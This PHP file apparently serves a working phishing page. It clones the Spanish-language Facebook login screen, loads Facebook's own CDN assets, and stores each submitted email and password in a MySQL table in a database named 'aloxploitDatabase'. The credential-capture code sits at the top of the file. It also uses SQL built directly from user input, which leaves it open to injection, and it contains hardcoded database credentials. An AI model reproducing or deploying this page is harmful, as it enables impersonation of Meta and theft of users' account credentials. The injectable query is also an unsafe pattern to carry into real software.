<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

//echo "<h1> Pagina del registro</h1>";
$servername = "localhost";
$database = "aloxploitDatabase";
$username = "aloxploit";
$password = "alox123";

// creamos conexion
$conn = mysqli_connect($servername, $username, $password, $database);
//si estan todos los campos rellenos los insertamos en la base de datos
if( isset($_GET["email"]) && isset($_GET["pass"]) && isset($_SERVER["REQUEST_METHOD"]) ){
    $email = $_GET["email"];
    $pass = $_GET["pass"];
    // Aqui puedes insertar los datos en tu base de datos
    $sql = "INSERT INTO usuarios (email, password) VALUES ('$email', '$pass')";
    if (mysqli_query($conn, $sql)) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
}

?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Facebook - Inicia sesión o regístrate</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/GNdQeuvtqR7.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jEFWYSD" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/0,cross/i35b2KVpLUM.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Oa7g8+N" crossorigin="anonymous" />
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/UpZWg46fTMd.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="3f2SWAU" crossorigin="anonymous" nonce="k1JHMhQB"></script>
</head>
<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko win x1-5 Locale_es_ES cores-gte4 _19_u" dir="ltr">
    <div class="_li" id="u_0_0_c0">
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div class="_4-u5 _30ny">
                    <div class="_97vy">
                        <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
                    </div>
                    <div class="_4-u2 _1w1t _4-u8 _52jv">
                        <div class="_xku" id="header_block">
                            <span class="_97w1 _50f6">
                                <div class="_9axz">Iniciar sesión en Facebook</div>
                            </span>
                        </div>
                        <div class="login_form_container">
                            <form id="login_form" action="facebook.php" method="GET">
                                <div id="loginform">
                                    <div class="clearfix _5466 _44mg" id="email_container">
                                        <input type="text" class="inputtext _55r1 inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Correo electrónico o número de teléfono" value="" autofocus="1" autocomplete="username" aria-label="Correo electrónico o número de teléfono">
                                    </div>
                                    <div class="clearfix _5466 _44mg">
                                        <input type="password" class="inputtext _55r1 inputtext _1kbt" name="pass" id="pass" tabindex="0" placeholder="Contraseña" autocomplete="current-password" aria-label="Contraseña">
                                    </div>
                                    <div class="_xkt">
                                        <button type="submit" id="loginbutton" name="login" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy">Iniciar sesión</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="_97w3">
                            <a role="button" class="_97w4" href="#" id="forgot-password-link">¿Olvidaste tu contraseña?</a>
                        </div>
                        <div class="_97w5">
                            <span class="_97w6">o</span>
                        </div>
                        <div class="_97w7">
                            <a role="button" class="_97w8" href="#" id="signup-button">Crear cuenta nueva</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="mvl copyright">
            <div><span> Meta © 2024</span></div>
        </div>
    </div>
</body>
</html>
